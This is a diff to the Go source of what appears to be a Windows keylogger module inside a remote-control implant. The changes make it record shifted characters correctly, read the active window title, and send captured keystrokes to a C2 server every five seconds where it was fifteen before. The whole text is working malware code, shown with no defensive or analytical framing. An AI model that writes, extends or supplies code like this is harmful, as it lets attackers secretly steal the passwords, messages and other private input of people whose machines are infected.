@@ -953,22 +953,34 @@ func getActiveWindowTitle() string {
 	return windows.UTF16PtrToString(&title[0])
 }
 
-func vkToString(vk int) string {
+func vkToString(vk int, shiftPressed bool) string {
 	specials := map[int]string{
 		8: "[BS]", 9: "[TAB]", 13: "[ENT]", 16: "", 17: "", 18: "", 20: "[CAPS]",
 		27: "[ESC]", 32: " ", 37: "[LEFT]", 38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]",
-		45: "[INS]", 46: "[DEL]", 91: "[WIN]", 112: "[F1]", 113: "[F2]", 114: "[F3]",
-		115: "[F4]", 116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]", 120: "[F9]",
-		121: "[F10]", 122: "[F11]", 123: "[F12]", 160: "", 161: "", 162: "", 163: "", 164: "", 165: "",
+		45: "[INS]", 46: "[DEL]", 91: "[WIN]",
+		112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
+		116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
+		120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
+		160: "", 161: "", 162: "", 163: "", 164: "", 165: "",
 	}
 	if s, ok := specials[vk]; ok {
 		return s
 	}
 	kbState := make([]byte, 256)
 	pGetKeyboardState.Call(uintptr(unsafe.Pointer(&kbState[0])))
-	sc, _, _ := pMapVirtualKeyW.Call(uintptr(vk), 3)
+	if shiftPressed {
+		kbState[16] = 0x80
+	}
+	sc, _, _ := pMapVirtualKeyW.Call(uintptr(vk), 0)
 	var charBuf [8]uint16
-	ret, _, _ := pToUnicode.Call(uintptr(vk), sc, uintptr(unsafe.Pointer(&kbState[0])), uintptr(unsafe.Pointer(&charBuf[0])), 8, 0)
+	ret, _, _ := pToUnicode.Call(
+		uintptr(vk),
+		sc,
+		uintptr(unsafe.Pointer(&kbState[0])),
+		uintptr(unsafe.Pointer(&charBuf[0])),
+		8,
+		0,
+	)
 	if int32(ret) > 0 {
 		return windows.UTF16PtrToString(&charBuf[0])
 	}
@@ -979,7 +991,6 @@ func keyloggerJob(ctx context.Context, c2 *C2Client) {
 	var buf strings.Builder
 	var title string
 	lastFlush := time.Now()
-	// Track previous key states for edge detection (only fire on key-down transition)
 	var prevState [256]bool
 	for {
 		select {
@@ -993,17 +1004,24 @@ func keyloggerJob(ctx context.Context, c2 *C2Client) {
 		for vk := 8; vk <= 254; vk++ {
 			state, _, _ := pGetAsyncKeyState.Call(uintptr(vk))
 			isDown := state&0x8000 != 0
+
 			if isDown && !prevState[vk] {
-				// Key just pressed (transition from up to down)
-				ch := vkToString(vk)
+				shiftState, _, _ := pGetAsyncKeyState.Call(uintptr(16))
+				shiftPressed := shiftState&0x8000 != 0
+
+				ch := vkToString(vk, shiftPressed)
 				if ch != "" {
+					if buf.Len() == 0 {
+						lastFlush = time.Now()
+					}
 					buf.WriteString(ch)
 					title = getActiveWindowTitle()
 				}
 			}
+
 			prevState[vk] = isDown
 		}
-		if time.Since(lastFlush) > 15*time.Second && buf.Len() > 0 {
+		if time.Since(lastFlush) > 5*time.Second && buf.Len() > 0 {
 			c2.SendKeylog(buf.String(), title)
 			buf.Reset()
 			lastFlush = time.Now()
